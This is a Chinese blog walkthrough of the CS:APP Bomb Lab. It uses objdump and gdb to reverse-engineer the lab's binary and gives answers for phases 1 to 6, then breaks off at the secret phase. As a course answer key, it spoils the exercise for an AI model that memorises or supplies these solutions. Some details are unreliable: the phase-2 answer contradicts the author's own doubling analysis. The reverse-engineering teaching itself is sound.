简介BombLab是CS:APP中对应第三章内容：程序的机器级表示的lab。主要内容为提供一个二进制对象文件bomb，当运行时，它会要求用户输入六个字符串，如果其中的任何一个不正确，炸弹就会爆炸，输出一行错误信息并向计分服务器提交（自学所用的材料不会向服务器提交信息，但这不代表我们可以随意让炸弹爆炸），学生必须通过反汇编和逆向工程来找到六个正确的字符串来解除自己的炸弹（理论上每个人的炸弹答案都不同，但自学材料的答案都是一样的，本文针对的是自学材料）。 所用工具objdump-用于反汇编二进制对象文件 VS Code-用于查看反汇编后的结果与文本文件的编写 gdb-用于运行时单步调试与查看运行时内存与寄存器信息 解题过程前期由于之前没有接触过类似的逆向工程问题，拿到问题以后第一时间很难马上开始解决。所以先查看我们能看到的文件信息。 目录中提供了一个bomb.c文件，文件内容十分简单，有一份非常有趣的LISENCE: /* * Dr. Evil’s Insidious Bomb, Version 1.1 * Copyright 2011, Dr. Evil Incorporated. All rights reserved. * * LICENSE: * * Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the * VICTIM) explicit permission to use this bomb (the BOMB). This is a * time limited license, which expires on the death of the VICTIM. * The PERPETRATOR takes no responsibility for damage, frustration, * insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other * harm to the VICTIM. Unless the PERPETRATOR wants to take credit, * that is. The VICTIM may not distribute this bomb source code to * any enemies of the PERPETRATOR. No VICTIM may debug, * reverse-engineer, run “strings” on, decompile, decrypt, or use any * other technique to gain knowledge of and defuse the BOMB. BOMB * proof clothing may not be worn when handling this program. The * PERPETRATOR will not apologize for the PERPETRATOR’s poor sense of * humor. This license is null and void where the BOMB is prohibited * by law. */ 接下来的部分就是main函数，从主函数中我们可以看到整个程序的结构与输入方式：可以从标准输入或文件中读取，一行作为一题的解，解出一个问题以后可以进入下一个问题，注意到返回前的一段注释： ​ /* Wow, they got it! But isn’t something… missing? Perhaps ​ * something they overlooked? Mua ha ha ha ha! */ 暗示了我们隐藏问题的存在，除此之外再也没有任何关于这个炸弹的信息。 下面我们使用objdump命令将炸弹文件反汇编出来： 1objdump -d bomb &gt; bomb.asm 然后通过VS Code来查看反汇编的结果，VS Code有x86 and x86_64 Assembly这个插件可以高亮汇编，看起来会舒服许多。 反汇编出来的代码有近六千行，但是因为有符号表的存在，说明保留了调试所需的信息，我们可以通过gdb进行单步调试来查看程序的运行过程。 在使用gdb 的时候，我们可以加上-tui命令并用layout asm命令切换到汇编指令模式，就可以在调试的时候查看对应的汇编代码了。界面如下： 可以看到地址0x400da0就是main函数的地址。 一直向下查看，我们就可以看到C文件中出现的initialize_bomb函数，然后就到了phase_1函数，我们可以推测这个函数就是判断是否通过的核心函数。 这时候就要用到gdb的指令了，在汇编模式下的指令与普通模式有一些不同。我们可以使用ni(next instruction)和si(step into)来实现普通模式下的单步向下执行与步入操作。 打断点需要使用b &lt;func_name&gt;或b *&lt;address&gt;来进行比如我们可以看到调用phase_1函数的call指令的地址是0x400e3a，所以我们可以使用b phase_1或b *0x400e3a来打断点的，这两条命令有一点不同就在于断在地址会停在地址 上也就是call指令的位置，断在函数名会进入函数中，相当于再进行了一次si操作。 断点停后有可能出现字符重叠的情况，我们可以使用refresh命令刷新界面。 下面把断点打在phase_1函数之后就可以使用r命令来运行指令了，程序会提示我们输入字符串，这个时候因为我们打了断点不用担心炸弹会爆炸，可以随意输入。执行后程序会停在phase_1函数的位置，我们可以看到函数内部的情况。 下面就可以根据函数内部的逻辑来解决炸弹了。 代码来自objdump -d反汇编出来的代码，与gdb的汇编模式下看到的代码是一样的。 主函数主函数代码比较长，只贴我们需要分析的关键部分。 12400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt;400e37: 48 89 c7 mov %rax,%rdi 第一句调用了read_line函数，我们可以转到函数入口地址40149e去查看read_line的代码（事实上一开始我也这么做了），但是会发现代码中包含了许多对系统库函数的调用，仔细分析的难度比较大并且没有必要。从提供的C代码与函数名称，我们可以推测出这个函数的作用是读取一行输入。根据返回值一般存放在rax中的约定，rax中应该就是读入的数据的地址，第二句中我们把这个值复制到了rdi中。 12400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt;400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt; 接下来两句分别开始调用phase_1与phase_defused，下面的五个阶段也是上面这样的模式。 阶段一1234567890000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 阶段一的代码比较短，第二行中把一个地址给了esi，接下来调用了strings_not_equal这个函数，我们可以跳到函数入口地址查看这个函数。 12340133c: 48 89 fb mov %rdi,%rbx40133f: 48 89 f5 mov %rsi,%rbp401342: e8 d4 ff ff ff callq 40131b &lt;string_length&gt; 函数中这两行分别把rdi rsi的值复制到了rbx与rbp，然后调用了string_length，这个时候就不用去看string_length函数了，我们可以直接猜测出rbx与rbp就是函数的参数。那么可以说明rdi rsi就是给string_not_equal的函数，那么string_not_equal的返回值是什么呢？ 看到string_not_equal返回后的5、6两句，测试了eax的值，在eax等于0时就跳转到400ef7，如果不为0，那么会继续向下执行，下面一句是调用explode_bomb函数，不用说这一定是触发炸弹的函数，所以我们需要令string_not_equal的返回值为0，那么从名字判断，我们需要令两个字符串相等，两个字符串之前说过存放在rdi与rsi中，rdi是我们读入的字符串，而rsi中存放的是400ee4复制的0x402400，这个时候用gdb去查看该地址中存放的字符串比较方便： 这串字符就是第一阶段的答案。 阶段二12345678910111213141516171819202122232425400efc: 55 push %rbp400efd: 53 push %rbx400efe: 48 83 ec 28 sub $0x28,%rsp400f02: 48 89 e6 mov %rsp,%rsi400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt;400f0a: 83 3c 24 01 cmpl $0x1,(%rsp)400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt;400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt;400f15: eb 19 jmp 400f30 &lt;phase_2+0x34&gt;400f17: 8b 43 fc mov -0x4(%rbx),%eax400f1a: 01 c0 add %eax,%eax400f1c: 39 03 cmp %eax,(%rbx)400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt;400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt;400f25: 48 83 c3 04 add $0x4,%rbx400f29: 48 39 eb cmp %rbp,%rbx400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt;400f2e: eb 0c jmp 400f3c &lt;phase_2+0x40&gt;400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp400f3a: eb db jmp 400f17 &lt;phase_2+0x1b&gt;400f3c: 48 83 c4 28 add $0x28,%rsp400f40: 5b pop %rbx400f41: 5d pop %rbp400f42: c3 retq 进入phase_2函数，观察它的代码，可以发现第5行调用了一个名为read_six_numbers这个函数，顾名思义，这个函数的作用应该是从输入中读取6个数字，那么问题来了，这6个数字是怎么返回的呢？我们注意到第4行中把rsp的值复制给了rsi，我们可以猜测这个函数是使用栈来返回读入的结果。 当然只是猜测是不行的，我们需要用实验去验证我们的想法，我们在输入文件中设置1 2 3 4 5 6这一行输入，然后将断点打在*400f0a这个函数刚返回的位置（注意输入中应该含有第一阶段的答案，不然炸弹就炸在第一阶段了）。运行停在断点之后查看栈中的内容： 我们打出了rsp开始32字节的内容，发现栈中依次存放了输入的6个数，之后就是返回的地址。那么我们可以确定读取的数值就是依次存放在栈中的。 接下来看第6、7、8行，它将rsp中存放的值与1进行比较，如果相等则跳过第8行的引爆代码，说明我们需要输入的第一个数为1 。再看跳转到的位置（19、20行）将rsp+0x4与rsp+0x18的值分别存放到了rbx与rbp。下一行又进行了一次跳转，来到了第10行，第10行将rbx的地址减4中存放的内容复制到了eax中，rbx的地址减4也就意味着与rsp相等，它的值也就是第一个读入的值。下一行将eax的值乘二，接下来将乘二后的值与rbx也就是第二个值进行比较，如果相同则跳过引爆代码。上面这一系列操作总结起来就是如果第二个值是第一个值的两倍则不引爆。 再往下就是把rbx的值加上4，因为一个int占4个字节，也就是把rbx指向了下一个读入的值。下一步将rbx与rbp的值进行比较，回想rbp的值为的rsp+0x18也就是 rsp+24，指向6个int值之后的位置，所以与它进行比较就是判断是否到达临界条件。如果没有到达临界条件，则跳到上一段中比较的部分继承进行。看到这里，我们已经可以判断出phase_2的要求是读入的6个数第一个数必为1，而后面的数字都是前面一个数字的两倍。 所以阶段2的答案为1 2 3 4 5 6. 阶段三阶段三的代码比较长，我们分开来看： 12345678910111213140000000000400f43 &lt;phase_3&gt;: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a &lt;phase_3+0x27&gt; 400f65: e8 d0 04 00 00 callq 40143a &lt;explode_bomb&gt; 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad &lt;phase_3+0x6a&gt; 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 第3、4两行将rsp+0xc与rsp+0x8的值分别给rcx与rdx，下一行将一个地址值复制给了esi，接着将eax置为0，下一步调用了库函数sscanf，我们想到sscanf中的参数中需要一个格式化字符串，那么esi中的这个地址值就很有可能存放了这个字符串，我们同样使用gdb在运行时查看这个字符串： 可以看到这就是格式化字符串，读入的是两个整型值。这两个值存放在哪里呢？我们想到之前把rsp+0xc与rsp+0x8的值分别给rcx与rdx，这是两个地址值，我们可以用之前的方法验证栈中存放的确实是我们读入的这两个值。 下面第8行将eax与1进行比较，eax一般用于存放函数返回值，而sscanf 的返回值是成功读入的数值个数，也就是说这几行将成功读入的个数与1进行比较，如果大于1则跳过引爆的代码。 下面第11行将rsp+0x8中存放的值与0x7进行比较，如果大于0x7则跳到400fad的位置，我们看这个地址的指令： 1400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt; 引爆炸弹。 下面的两行比较关键：第13行将rsp+0x8中存放的值复制入eax，第14行进行一个跳转，跳转到的地址为0x402470(,%rax,8)，这就是一个典型的switch语句的实现：直接跳转到索引*位移的指令位置。 123456789101112131415161718192021222324252627282930313233x = 0400f7c: b8 cf 00 00 00 mov $0xcf,%eax400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt;x = 2400f83: b8 c3 02 00 00 mov $0x2c3,%eax400f88: eb 34 jmp 400fbe &lt;phase_3+0x7b&gt;x = 3400f8a: b8 00 01 00 00 mov $0x100,%eax400f8f: eb 2d jmp 400fbe &lt;phase_3+0x7b&gt;x = 4400f91: b8 85 01 00 00 mov $0x185,%eax400f96: eb 26 jmp 400fbe &lt;phase_3+0x7b&gt;x = 5400f98: b8 ce 00 00 00 mov $0xce,%eax400f9d: eb 1f jmp 400fbe &lt;phase_3+0x7b&gt;x = 6400f9f: b8 aa 02 00 00 mov $0x2aa,%eax400fa4: eb 18 jmp 400fbe &lt;phase_3+0x7b&gt;x = 7400fa6: b8 47 01 00 00 mov $0x147,%eax400fab: eb 11 jmp 400fbe &lt;phase_3+0x7b&gt;400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt;400fb2: b8 00 00 00 00 mov $0x0,%eax400fb7: eb 05 jmp 400fbe &lt;phase_3+0x7b&gt;x = 1400fb9: b8 37 01 00 00 mov $0x137,%eax400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax400fc2: 74 05 je 400fc9 &lt;phase_3+0x86&gt;400fc4: e8 71 04 00 00 callq 40143a &lt;explode_bomb&gt;400fc9: 48 83 c4 18 add $0x18,%rsp400fcd: c3 retq 上面的代码已经加了注释，假设读入的第一个数为x，看到所有分支最后都跳转到了400fbe这行判断中，将eax中的值与rsp+0xc也就是我们读入的第二个数进行判断，如果相等的话跳过引爆代码。 而每个分支都将一个数复制到了eax中，也就是说我们只要根据不同的第一个参数的值读入对应的第二个参数就可以了，所以我们可以随意选择一个x值，这里我选择x=1，对应的第二个参数为0x137换成十进制是311，所以第3阶段的（一个）答案为： 1 311 阶段四123456789101112131415161718000000000040100c &lt;phase_4&gt;: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 &lt;phase_4+0x29&gt; 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a &lt;phase_4+0x2e&gt; 401035: e8 00 04 00 00 callq 40143a &lt;explode_bomb&gt; 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce &lt;func4&gt; 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 &lt;phase_4+0x4c&gt; 前面的代码比较熟悉，同样是调用了sscanf函数，我们查看格式字符串： 也是读入两个参数存放在rcx与rdx中。 同样对读入参数的个数进行了判断，要求成功读入参数的个数等于两个，第11、12行要求输入的第一个参数小于0xe。 接下来把0xe赋给edx、0x0赋给esi，rsp+0x8的值赋给edi。接下来调用了func4函数。 在去查看func4函数的代码之前，我们先查看函数返回后的代码，了解我们需要的结果。第17、18行测试了eax的值如果不为0，就跳转到引爆代码。 所以我们的目标是返回时eax的值为0.下面进入func4函数。 12345678910111213141516171819202122230000000000400fce &lt;func4&gt;: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq 这段代码之中我们调用了func4，这是一个递归的过程，像之间那样直接分析比较困难，这里我们就将这个代码逆向为C语言再来分析，下面是逆向出的C语言代码： 12345678910111213int fun(int a1, int a2, int x)&#123; int b = (a1 - a2) &gt;&gt; 31; int result = ((a1-a2) + b) &gt;&gt; 1; b = result + a2; if(b == x) return 0; if(b &lt; x) &#123; result = fun(a1, b + 1, x); return result * 2 + 1; &#125;else&#123; result = fun(b - 1, a2, x); return result * 2; &#125;&#125; 这里的a1``a2初始值分别为之前的0xe与0x0。我们可以直接写个测试程序来跑出能返回0的输入值： 123456789int main(void)&#123; for(int i = 0; i &lt;= 0xe; i++)&#123; if(fun(0xe,0,i) == 0)&#123; printf(\"%d\\n\",i) ; return 0; &#125; &#125; return 0; &#125; 得出允许的值有0 1 3 7. 回到phase_4的代码： 12345401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp)401056: 74 05 je 40105d &lt;phase_4+0x51&gt;401058: e8 dd 03 00 00 callq 40143a &lt;explode_bomb&gt;40105d: 48 83 c4 18 add $0x18,%rsp401061: c3 retq 第1、2行将输入的第二个参数与0进行比较，如果不为0就引爆炸弹。所以输入的第二个参数必为0。 综上我们得出（一个）答案为： 0 0 阶段五后面的阶段难度开始加大，我们分部分进行分析： 12345670000000000401062 &lt;phase_5&gt;: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) 第4行把输入的地址rdi给rbx，第5、7行则是在栈中压入了一个哨兵变量。 12345401078: 31 c0 xor %eax,%eax40107a: e8 9c 02 00 00 callq 40131b &lt;string_length&gt;40107f: 83 f8 06 cmp $0x6,%eax401082: 74 4e je 4010d2 &lt;phase_5+0x70&gt;401084: e8 b1 03 00 00 callq 40143a &lt;explode_bomb&gt; 第1行清空了eax，第2行中调用了string_length，我们想到之前的把输入放入rbx这个动作，可以推测这个函数是为了统计输入字符的个数，并存放在了eax中。 下面将eax的值与0x6进行比较，等于则进行跳转避免引爆炸弹。我们进入跳转到的位置： 124010d2: b8 00 00 00 00 mov $0x0,%eax4010d7: eb b2 jmp 40108b &lt;phase_5+0x29&gt; 把eax置为0后进行跳转。 继续进入跳转到的位置： 12345678940108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 第1行中movzbl命令将从rbx（输入）开始的rax位置的一个字节赋给ecx的低16位。 接下来的两行先把cl中的值（上一步得到）复制到rsp处，再将rsp中的值复制到rdx中，第4行使用掩码0xf取edx的低4位。到这里我们总结一下上面的操作：取读入的字符串中rax位置处的字符，再取它的低4位放在edx中。 下面第5行中，将地址0x4024b0+rdx中的一个字节放入edx的低16位中。第6行将这16位复制到了rsp+0x10+rax的位置中。 接下来把rax加1，我们从前面可以看出来这个rax起的是一个索引的作用。第 8行与6进行比较，如果不等于6则跳到第1行重复这个过程。 在这段之中，循环一共进行了6次，分别读取了输入的6个字符，记录这个6个字符的低6位作为索引rdx，从0x4024b0+rdx的位置复制一个字节到rsp+0x10开始的6字节中。结束之后，rsp+0x10开始存放了6个字符。 14010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 接下来一行在rsp+0x16的位置也就是6个字符之后置上一个0x0也就是终止符\\0。 1234564010b3: be 5e 24 40 00 mov $0x40245e,%esi4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt;4010c2: 85 c0 test %eax,%eax4010c4: 74 13 je 4010d9 &lt;phase_5+0x77&gt;4010c6: e8 6f 03 00 00 callq 40143a &lt;explode_bomb&gt; 接下来将0x40245e这个地址赋给esi，把rsp+0x10这个地址赋给rdi，接下来调用strings_not_equal这个函数，之前的经验告诉我们esi与rdi就是要比较的两个字符串的首地址。如果两个字符串不相同就引爆炸弹。 我们先看0x40245e位置的字符串： 这就是我们应该构造并存放在rsp+0x10处的字符串。 接下来再查看我们复制到rsp中的字符来源也就是0x4024b0开始的字符： 可以看到我们需要的字符flyers的索引分别为9 15 14 5 6 7。这个索引就是我们输入的字符的低4位，那我们只要找到低4位分别是以上数值的字符就可以了。 所以阶段5的（一个）答案为： ionefg 阶段六阶段六可以说是最复杂的一个阶段，同样一步步分析： 1234567891000000000004010f4 &lt;phase_6&gt;: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c &lt;read_six_numbers&gt; 读入6个数字，存放位置还是栈中。 1234567891011121314151617181920212240110b: 49 89 e6 mov %rsp,%r1440110e: 41 bc 00 00 00 00 mov $0x0,%r12d401114: 4c 89 ed mov %r13,%rbp401117: 41 8b 45 00 mov 0x0(%r13),%eax40111b: 83 e8 01 sub $0x1,%eax40111e: 83 f8 05 cmp $0x5,%eax401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt;401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt;401128: 41 83 c4 01 add $0x1,%r12d40112c: 41 83 fc 06 cmp $0x6,%r12d401130: 74 21 je 401153 &lt;phase_6+0x5f&gt;401132: 44 89 e3 mov %r12d,%ebx401135: 48 63 c3 movslq %ebx,%rax401138: 8b 04 84 mov (%rsp,%rax,4),%eax40113b: 39 45 00 cmp %eax,0x0(%rbp)40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt;401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt;401145: 83 c3 01 add $0x1,%ebx401148: 83 fb 05 cmp $0x5,%ebx40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt;40114d: 49 83 c5 04 add $0x4,%r13401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; 前面是一系列的赋值操作，第5行将eax减1，eax中的值是rsp位置存放的值。第6、7两行将减一以后的值与5进行比较，小于等于5则跳过引爆代码。也就是说rsp中存放的第一个数必须小于等于6. 之前将r12d置为0，第9行中将r12d的值增加1，下一行与6进行比较，如果相等则跳入下一个阶段。 第12行中把r12d中的值复制给了ebx，下一步又赋给了rax，接下来的一行mov将rsp+rax*4中的值（也就是第rax+1个读入的int值）给了eax。 下一步将eax中的值与rbp地址指向的值进行比较，如果不相同则跳过引爆代码。说明这两个值需要不同，再接下来将ebx中的值加1，再与5进行比较，如果小于等于5则跳到第13行中，更新rax的值，再去从栈中取下一个新的int值和rbp中的进行比较。到这里我们可以看出，从13行到20行相当于一个内循环，从r12d开始，到5结束，不断地取栈中的值与rbp的值比较，也就是要求rbp之后的值需要与rbp不同。 第21、22行则是外循环，它更新了r13的值，令r13指向下一个int值。跳到第3行用r13的值更新rbp的值，也就是把比较的对象向后移一个。同样要求该值小于等于5。后面再进行内循环比较之后的值。 这里我们就可以明白这段代码的作用：限制读入的6个数必须小于等于6并且互不相等。 123456789401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi401158: 4c 89 f0 mov %r14,%rax40115b: b9 07 00 00 00 mov $0x7,%ecx401160: 89 ca mov %ecx,%edx401162: 2b 10 sub (%rax),%edx401164: 89 10 mov %edx,(%rax)401166: 48 83 c0 04 add $0x4,%rax40116a: 48 39 f0 cmp %rsi,%rax40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; 第1行中将rsp+0x18的值赋给rsi。 第2行将r14的值赋给rax，r14的值是之前保存的rsp。 第3行将0x7赋给ecx，第4行又将ecx复制给edx。 下一步将edx减去rax存放的地址指向的值，接下来又将edx的值赋回rax存放的地址指向的值。 第7行将rax的值加4，也就是指向了下一个int值，接着与之前设定的rsi进行的比较，如果不相等则重复这个过程。rsi实际上指向的是6个int值之后的位置，作为一个标记使用。 这段代码总结起来就是将栈中的6个值（假设为x）变为7-x。 123456789101112131415161718192040116f: be 00 00 00 00 mov $0x0,%esi401174: eb 21 jmp 401197 &lt;phase_6+0xa3&gt;401176: 48 8b 52 08 mov 0x8(%rdx),%rdx40117a: 83 c0 01 add $0x1,%eax40117d: 39 c8 cmp %ecx,%eax40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt;401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt;401183: ba d0 32 60 00 mov $0x6032d0,%edx401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2)40118d: 48 83 c6 04 add $0x4,%rsi401191: 48 83 fe 18 cmp $0x18,%rsi401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt;401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx40119a: 83 f9 01 cmp $0x1,%ecx40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt;40119f: b8 01 00 00 00 mov $0x1,%eax4011a4: ba d0 32 60 00 mov $0x6032d0,%edx4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt; 进入下一段代码，一开始先将esi归零，然后跳到第14行处执行。 第14行中从rsp+rsi的位置（也就是栈中我们读入的位置）取出一个数赋给ecx，接下来对取出的这个值进行判断，如果它小于等于1则跳到第9行处。 我们在这里假设这个数确实小于等于1。到第9行，将一个地址值赋给了edx，接下来将edx的值赋给了rsp+2*rsi+0x20的地址指向的值，这里我们可以知道rsi起到的是索引的作用，下面一行将rsi增加4，说明从rsp+0x20开始存放8个字节的数据。再将rsi的值与0x18作比较，说明整个过程要进行6次。接下来又到了第14行将下一个int值给rcx。 那么如果rcx的值不小于等于1，继续往下走，第18行将0x1赋给eax，19行将0x6032d0这个地址赋给edx，接下来跳转到了第3行。第3-6行的代码是一起的，也是理解这个过程的关键。 首先第3行的命令，把edx+0x8地址指向的值赋给了edx，这步操作一开始比较难以理解，我们需要先看看edx的初始状态是什么样的，使用gdb在运行时查看内存： 我们可以从这个信息中看出，其实它就是一个链表的结构，首先名字就是node给了提示，再者每一个node中偏移8个字节中储存的都是下一个节点的地址，那么前面8个字节自然就是节点储存的数据。 我们再回过头来看第3行的代码，就不难理解这个操作就是我们常用的p = p -&gt; next，也就是指向下一个节点。 第4行把eax增1，再将eax与ecx进行比较，如果不等就再跳到第3步指向链表下一个节点，那么可以看出这4行代码的作用就是从edx这个初始位置开始向后移动ecx-1次，第7行跳过了第9行，把edx赋给了rsp+0x20开始的第rsi个8字节的位置。如果rsi达到0x18则跳出这部分代码。 我们整理一下这个过程，其实就是依次从栈中读取存放的6个数放入rcx，再根据rcx的值找到链表中对应的节点，把节点的地址放入rsp+0x20开始的对应位置中。 1234567891011124011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi4011ba: 48 89 d9 mov %rbx,%rcx4011bd: 48 8b 10 mov (%rax),%rdx4011c0: 48 89 51 08 mov %rdx,0x8(%rcx)4011c4: 48 83 c0 08 add $0x8,%rax4011c8: 48 39 f0 cmp %rsi,%rax4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt;4011cd: 48 89 d1 mov %rdx,%rcx4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt;4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 这段代码前三行分别将rsp+0x20地址指向值、rsp+0x28的值、rsp+0x50的值赋给了rbx 、rax、rsi。第4行将rbx复制到rcx中，第5行将rax（rsp+0x20）中存放的地址复制入rdx，第6行将这个数据赋给了rcx（也就是rbx、*(rsp+0x20)）节点的指针域。下一步将rax增加8，指向栈中的下一个位置。再与rsi这个临界地址进行比较，如果rax超出末端则跳出这段代码到第12行的位置。 下面把rdx中存放的地址值赋给rcx，跳转到第5行重复过程。 仔细分析，这个过程其实就是按照链表节点在栈中的位置重新将链表连接起来。 最后跳出的第12行则是把新的表尾的指针域赋为NULL。 12345678910111213141516174011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp4011df: 48 8b 43 08 mov 0x8(%rbx),%rax4011e3: 8b 00 mov (%rax),%eax4011e5: 39 03 cmp %eax,(%rbx)4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt;4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt;4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx4011f2: 83 ed 01 sub $0x1,%ebp4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt;4011f7: 48 83 c4 50 add $0x50,%rsp4011fb: 5b pop %rbx4011fc: 5d pop %rbp4011fd: 41 5c pop %r124011ff: 41 5d pop %r13401201: 41 5e pop %r14401203: c3 retq 第2行将ebp赋上0x5，第三行中rbx的值是之前的rsp+0x20，那么rbx+0x8这个地址中存放的值就是下一个节点的地址，赋给了rax。 第4行将rax代表的节点的数据取出放入eax，再与rbx代表的节点的数据的值的低4位进行比较，如果前一个节点的数据的低4字节大于等于后一个节点的，则跳过引爆代码。 第8行又是熟悉的操作：使rbx指向下一个节点。 第9、10行减小ebp这个循环变量再进行判断，保证循环进行5次。 也就是说，我们需要使新的链表中前一个节点存放的数据值的低4字节都大于后一个节点的。 弄清楚了过程，下面就可以开始反推答案了： 先找到正确的链表节点排列，根据图： 数据由大到小的排列依次是3 4 5 6 1 2。 由于有一步x = 7 - x，所以倒推回来的答案应该是： 4 3 2 1 6 5 秘密阶段在之前C代码的暗示以及我们查看汇编代码的过程中都可以猜测出有一个秘密阶段的存在，secret_phase的代码就在phase_6后的func7之后。第一个问题是我们如何进入secret_phase。 这里可以用一个简单的方法，直接在反汇编代码中搜索secret_phase的入口地址，很快就可以发现在每个阶段的phase_x之后都有一行phase_defused，就在这个函数里面存在callq secret_phase的代码。 我们就开始分析这个phase_defused： 